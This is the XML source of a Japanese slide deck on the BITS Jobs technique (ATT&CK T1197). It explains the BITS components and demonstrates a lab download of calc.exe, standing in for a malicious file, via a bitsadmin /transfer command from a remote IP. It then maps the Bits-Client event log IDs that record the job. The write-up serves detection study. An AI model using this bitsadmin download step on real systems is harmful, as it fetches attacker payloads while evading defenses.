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66" r:id="rId4"/>
    <p:sldId id="268" r:id="rId5"/>
    <p:sldId id="259" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="269" r:id="rId8"/>
    <p:sldId id="258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607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787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4404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03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18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69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91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110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467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5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BB662-5897-4C29-AB78-A9B649594C48}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2021/6/13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22FCD-4327-439B-8CFD-144357B59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913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4628125" y="2979082"/>
            <a:ext cx="247574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4800" dirty="0" smtClean="0"/>
              <a:t>BITS Jobs</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp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538906"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7289040" y="477078"/>
          <a:ext cx="4274279" cy="1237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457">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1219822650"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2793822">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="157075404"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="299716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400" dirty="0" smtClean="0"/>
                        <a:t>T1197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530879"/>
                  </a:ext>
                </a:extLst>
              </a:tr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Tactic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dirty="0" smtClean="0"/>
                        <a:t>Defense Evasion, Persistence</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" b="0" i="0" kern="120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99282"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="221021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Techniques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400" dirty="0" smtClean="0"/>
                        <a:t>BITS Jobs</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP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952819"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="322718">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP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Sub-techniques</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP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endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP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100698"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="テキスト ボックス 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251791" y="275062"/>
            <a:ext cx="4780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2021.06.13(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>日</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>松井 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" smtClean="0"/>
              <a:t>(@apt773)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70658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456175" y="1415577"/>
            <a:ext cx="1123308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Windows Background Intelligent Transfer Service</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="28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ダウンロードまたはアップロードジョブを作成し、その進行状況を監視するコマンドラインツール</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="28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/>
              <a:t>ネットワークの使用状況を考慮</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>してユーザ影響を抑える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PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>コマンドレットおよび</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>BITSAdminユーティリティによりアクセス</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="正方形/長方形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456175" y="293032"/>
            <a:ext cx="41634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4800" dirty="0" smtClean="0"/>
              <a:t>BITS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="4800" dirty="0" smtClean="0"/>
              <a:t>とは</a:t>
            </a:r>
            <a:endParaRPr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784582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456175" y="1177316"/>
            <a:ext cx="11550295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2400" dirty="0" smtClean="0"/>
              <a:t>BITS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>は、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Bitsproxy.dll, qmgrprxy.dll </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>をロードするクライアント </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" err="1"/>
              <a:t>bitsadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>と、サーバ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" smtClean="0"/>
              <a:t> (service DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> である</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" smtClean="0"/>
              <a:t> qmgr.dll </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>をホストする </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" smtClean="0"/>
              <a:t>svchost.exe) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>で構成される</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="正方形/長方形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456175" y="293032"/>
            <a:ext cx="41634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4800" dirty="0" smtClean="0"/>
              <a:t>BITS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="4800" dirty="0" smtClean="0"/>
              <a:t>とは</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="4800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79" y="2818356"/>
            <a:ext cx="6117355" cy="3359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正方形/長方形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6404276" y="3228039"/>
            <a:ext cx="1355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qmgrprxy.dll</a:t>
            </a:r>
            <a:endParaRPr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6305193" y="2805420"/>
            <a:ext cx="3628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C:\Windows\System32\BitsProxy.dll</a:t>
            </a:r>
            <a:endParaRPr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2405378" y="6329463"/>
            <a:ext cx="1178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BITS Client</a:t>
            </a:r>
            <a:endParaRPr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8419828" y="6177782"/>
            <a:ext cx="1238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BITS Server</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US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45" y="4263024"/>
            <a:ext cx="6174236" cy="16209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3439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394780" y="3008018"/>
            <a:ext cx="73773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200" dirty="0"/>
              <a:t>ダウンロードさせるリモートファイルの準備</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="210926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th_business_icon_simple_P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850" y="2324925"/>
            <a:ext cx="1761869" cy="17618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extLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROORKqe-ptPbr7MRp1ETbcbSDCrODdLRvmHA&amp;usqp=CAU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80148" y="2419458"/>
            <a:ext cx="1657280" cy="99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矢印コネクタ 7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4596646" y="2739342"/>
            <a:ext cx="2912519" cy="2650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>
            <a:off x="4596646" y="3078259"/>
            <a:ext cx="2213113" cy="407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拡張子「.msi」のファイルとは何？exeとの違いを紹介！ | Apric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759" y="2828938"/>
            <a:ext cx="753841" cy="75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th_business_icon_simple_P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092" y="2324925"/>
            <a:ext cx="1761869" cy="17618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extLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 2" descr="https://teorema-rd.com/wp-content/uploads/2020/05/logo-windows-server-201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769" y="2465437"/>
            <a:ext cx="1532857" cy="86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正方形/長方形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156352" y="355360"/>
            <a:ext cx="64764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ダウンロードさせるリモートファイルの準備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5956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56352" y="355360"/>
            <a:ext cx="64764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ダウンロードさせるリモートファイルの準備</a:t>
            </a:r>
            <a:endParaRPr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6352" y="1345095"/>
            <a:ext cx="11810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本検証では、悪意のあるファイルとして</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" smtClean="0"/>
              <a:t>calc.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>を配置しています。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty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52" y="2622005"/>
            <a:ext cx="11935228" cy="3280249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="正方形/長方形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156352" y="1729210"/>
            <a:ext cx="11401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リモートサーバを </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>SimpleHTTPServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で実現した場合、サーバが </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Range </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>プロトコルヘッダーをサポートしていないという理由でダウンロードが失敗します。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="352840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158848" y="2945517"/>
            <a:ext cx="10121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smtClean="0"/>
              <a:t>transfer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="3200" dirty="0" smtClean="0"/>
              <a:t>スイッチを</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="3200" dirty="0" smtClean="0"/>
              <a:t>した</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>リモートファイルのダウンロード</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="51905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156352" y="1103306"/>
            <a:ext cx="11482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ターゲット端末上の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1" smtClean="0"/>
              <a:t>Powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>にて、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1" smtClean="0"/>
              <a:t>bitsadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>ツールの</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" smtClean="0"/>
              <a:t>transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>スイッチを実行します。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ジョブ名をここでは</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" smtClean="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>としています。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156352" y="355360"/>
            <a:ext cx="8831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transfer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>スイッチを</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>した</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>リモートファイルのダウンロード</a:t>
            </a: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52" y="2178296"/>
            <a:ext cx="11985059" cy="421350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52" y="2741093"/>
            <a:ext cx="9305700" cy="118324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52" y="4293667"/>
            <a:ext cx="8020239" cy="2203608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="テキスト ボックス 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156352" y="3924335"/>
            <a:ext cx="11482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/transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>スイッチを</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>利用してリモートファイルがダウンロードできることを確認します。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="正方形/長方形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156352" y="1678639"/>
            <a:ext cx="113951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/>
              <a:t>bitsadmin.exe /transfer test http://192.168.10.254:443/calc.exe $env:USERPROFILE\Desktop\calc.exe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393" y="4293667"/>
            <a:ext cx="2777662" cy="218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38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421567"/>
            <a:ext cx="7243733" cy="22497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テキスト ボックス 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="174171"/>
            <a:ext cx="407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ログ出力（１／３）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="正方形/長方形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5043955" y="174171"/>
            <a:ext cx="6914778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ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Microsoft</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>-Windows-Bits-Client/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Operational</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>イベントログのパス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>evtx</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="正方形/長方形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752600" y="3771075"/>
            <a:ext cx="8750300" cy="419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b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>①</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0" err="1" smtClean="0"/>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>：新しいジョブの作成（ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>BITS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>クライアント・プロセスのパスとジョブ名を含む）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="直線コネクタ 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7861653" y="3142734"/>
            <a:ext cx="7997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8661400" y="2958068"/>
            <a:ext cx="344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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>①</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" b="1" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：新しいジョブの作成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pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="図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699" y="4299667"/>
            <a:ext cx="7501695" cy="2323424"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="正方形/長方形 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2273300" y="5685783"/>
            <a:ext cx="6885882" cy="2070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2273300" y="5057443"/>
            <a:ext cx="3213100" cy="238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7389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35" y="4290297"/>
            <a:ext cx="6201640" cy="2514951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421567"/>
            <a:ext cx="7243733" cy="22497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正方形/長方形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5043955" y="174171"/>
            <a:ext cx="6914778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ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Microsoft</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>-Windows-Bits-Client/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Operational</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>イベントログのパス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>evtx</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="正方形/長方形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752600" y="3771075"/>
            <a:ext cx="8750300" cy="419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b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>②</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0" err="1"/>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t> 59 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>：転送ジョブの開始（通信先</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" b="1" u="sng" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1600" b="1" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="直線コネクタ 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7768394" y="2660134"/>
            <a:ext cx="81680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8585201" y="2475468"/>
            <a:ext cx="337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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>②</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill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</a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 59 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：転送ジョブの開始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239932" y="5294048"/>
            <a:ext cx="4440268" cy="217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04800" y="174171"/>
            <a:ext cx="407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ログ出力（２／３）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98873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77" y="4339245"/>
            <a:ext cx="7372667" cy="2098628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421567"/>
            <a:ext cx="7243733" cy="22497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正方形/長方形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5043955" y="174171"/>
            <a:ext cx="6914778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ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Microsoft</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>-Windows-Bits-Client/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>Operational</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>イベントログのパス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>evtx</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
